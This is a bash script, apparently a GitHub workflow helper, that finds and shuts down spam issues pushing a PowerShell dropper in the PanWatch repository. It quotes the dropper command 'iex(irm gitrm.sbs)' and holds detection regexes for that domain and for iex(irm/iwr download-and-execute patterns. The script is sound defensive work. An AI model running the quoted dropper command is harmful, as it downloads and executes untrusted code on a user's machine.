#!/usr/bin/env bash
# Auto-triage malware spam issues for PanWatch.
#
# Handles the recurring "Easy Install" spam campaign that posts a PowerShell
# dropper (`iex(irm gitrm.sbs)`) disguised as an official installer.
#
# Modes:
#   anti-spam-sweep.sh --issue <number>   triage a single issue (issues event)
#   anti-spam-sweep.sh --sweep [limit]    scan recent open issues (scheduled fallback)
#
# Environment:
#   REPO            owner/name (required at runtime)
#   DRY_RUN=1       report matches and would-be actions, mutate nothing
#
# Detection tiers:
#   hard  — body contains the dropper domain or iex(irm/iex(iwr pattern:
#           comment, close, lock, minimize comments, block the author
#   title — only the "[Easy Install]" title template matches:
#           comment, close, lock, minimize comments; NO block (safer)
#
# Blocking and comment minimization need a token with the `user` scope
# (secret SPAM_PAT). With the default GITHUB_TOKEN they degrade gracefully
# and are reported in the job summary instead.
set -euo pipefail

REPO="${REPO:-}"
DRY_RUN="${DRY_RUN:-0}"
REPO_OWNER="${REPO_OWNER:-}"

# Portable lowercasing (macOS ships bash 3.2 without ${var,,}).
lower() {
  printf '%s' "$1" | tr '[:upper:]' '[:lower:]'
}
WARN_COMMENT='⚠️ **Spam distributing malware.** The PowerShell command in this issue downloads and executes code from an untrusted third-party domain. PanWatch is Docker-only, do not run it. ｜ 钓鱼垃圾内容：该命令会从第三方域名下载并执行任意代码，PanWatch 仅通过 Docker 分发，请勿运行。'

log_summary() {
  if [[ -n "${GITHUB_STEP_SUMMARY:-}" ]]; then
    printf '%s\n' "$1" >> "$GITHUB_STEP_SUMMARY"
  else
    printf '%s\n' "$1"
  fi
}

# Emits "hard", "title", or "" for the given title/body.
classify_issue() {
  local title body
  title="$(lower "$1")"
  body="$(lower "$2")"
  if [[ "$body" == *gitrm.sbs* ]] || [[ "$body" =~ iex[[:space:]]*\([[:space:]]*i(mr|wr) ]]; then
    printf 'hard\n'
  elif [[ "$title" == *"[easy install]"* ]]; then
    printf 'title\n'
  else
    printf '\n'
  fi
}

ensure_repo_owner() {
  if [[ -z "$REPO_OWNER" ]]; then
    REPO_OWNER="$(gh api "repos/$REPO" --jq '.owner.login')"
  fi
}

# True for external accounts; the repo owner and the Actions bot itself are
# never blocked.
is_blockable_author() {
  local login
  login="$(lower "$1")"
  [[ "$login" != "$(lower "$REPO_OWNER")" && "$login" != "github-actions[bot]" ]]
}

minimize_batch() {
  if [[ "$DRY_RUN" == "1" ]]; then
    log_summary "  would minimize $# comment(s)"
    return 0
  fi
  local q="mutation {" i=0
  for id in "$@"; do
    i=$((i + 1))
    q+=" m$i: minimizeComment(input: {subjectId: \"$id\", classifier: SPAM}) { minimizedComment { isMinimized } }"
  done
  q+=" }"
  if gh api graphql -f query="$q" >/dev/null 2>&1; then
    log_summary "  minimized $# comment(s)"
  else
    log_summary "  ⚠️ comment minimization failed (token may lack permission) — hide manually"
  fi
}

minimize_comments() {
  local n="$1" ids batch=()
  ensure_repo_owner
  ids="$(gh api "repos/$REPO/issues/$n/comments?per_page=100" \
    --jq '.[] | select((.user.login | ascii_downcase) as $l | $l != "'"$(lower "$REPO_OWNER")"'" and $l != "github-actions[bot]") | .node_id' || true)"
  if [[ -z "$ids" ]]; then
    return 0
  fi
  while IFS= read -r id; do
    batch+=("$id")
    if (( ${#batch[@]} == 39 )); then
      minimize_batch "${batch[@]}"
      batch=()
    fi
  done <<< "$ids"
  if (( ${#batch[@]} > 0 )); then
    minimize_batch "${batch[@]}"
  fi
}

block_user() {
  local u="$1"
  if ! is_blockable_author "$u"; then
    return 0
  fi
  if [[ "$DRY_RUN" == "1" ]]; then
    log_summary "  would block @$u"
    return 0
  fi
  if gh api "user/blocks/$u" >/dev/null 2>&1; then
    log_summary "  @$u already blocked"
  elif gh api -X PUT "user/blocks/$u" >/dev/null 2>&1; then
    log_summary "  blocked @$u"
  else
    log_summary "  ⚠️ could not block @$u (token needs the \`user\` scope, set secret SPAM_PAT) — manual: gh api -X PUT user/blocks/$u"
  fi
}

triage_issue() {
  local n="$1" json title body state locked author cls
  ensure_repo_owner
  json="$(gh api "repos/$REPO/issues/$n")"
  if jq -e '.pull_request' <<<"$json" >/dev/null; then
    return 0
  fi
  title="$(jq -r '.title' <<<"$json")"
  body="$(jq -r '.body // ""' <<<"$json")"
  state="$(jq -r '.state' <<<"$json")"
  locked="$(jq -r '.locked' <<<"$json")"
  author="$(jq -r '.user.login' <<<"$json")"
  cls="$(classify_issue "$title" "$body")"
  if [[ -z "$cls" ]]; then
    return 0
  fi
  log_summary "- #$n by @$author — spam matched ($cls)"
  if [[ "$state" == "open" && "$locked" != "true" ]]; then
    if [[ "$DRY_RUN" == "1" ]]; then
      log_summary "  would comment, close and lock"
    else
      gh issue comment "$n" --repo "$REPO" --body "$WARN_COMMENT" >/dev/null 2>&1 \
        || log_summary "  ⚠️ warning comment failed (already present or race)"
      if gh issue close "$n" --repo "$REPO" --reason "not planned" >/dev/null 2>&1; then
        if gh issue lock "$n" --repo "$REPO" --reason spam >/dev/null 2>&1; then
          log_summary "  commented, closed, locked"
        else
          log_summary "  closed; lock skipped (already locked or race)"
        fi
      else
        log_summary "  close skipped (already handled by a parallel run)"
      fi
    fi
  else
    log_summary "  already $state/locked — triage skipped"
  fi
  minimize_comments "$n"
  if [[ "$cls" == "hard" ]]; then
    block_user "$author"
  fi
}

sweep() {
  local limit="${1:-100}" numbers n count=0
  numbers="$(gh api "repos/$REPO/issues?state=open&per_page=$limit" --jq '
    .[] | select(.pull_request == null)
      | select((.title | test("\\[easy install\\]"; "i"))
            or (.body // "" | test("gitrm\\.sbs"; "i"))
            or (.body // "" | test("iex\\s*\\(\\s*i(mr|wr)"; "i")))
      | .number' || true)"
  while IFS= read -r n; do
    if [[ -z "$n" ]]; then
      continue
    fi
    count=$((count + 1))
    triage_issue "$n"
  done <<< "$numbers"
  log_summary "Swept open issues, triaged $count."
}

main() {
  if [[ -z "$REPO" ]]; then
    echo "REPO must be set (owner/name)" >&2
    exit 2
  fi
  case "${1:-}" in
    --issue)
      [[ -n "${2:-}" ]] || { echo "usage: $0 --issue <number>" >&2; exit 2; }
      triage_issue "$2"
      ;;
    --sweep)
      sweep "${2:-100}"
      ;;
    *)
      echo "usage: $0 --issue <number> | --sweep [limit]" >&2
      exit 2
      ;;
  esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
  main "$@"
fi
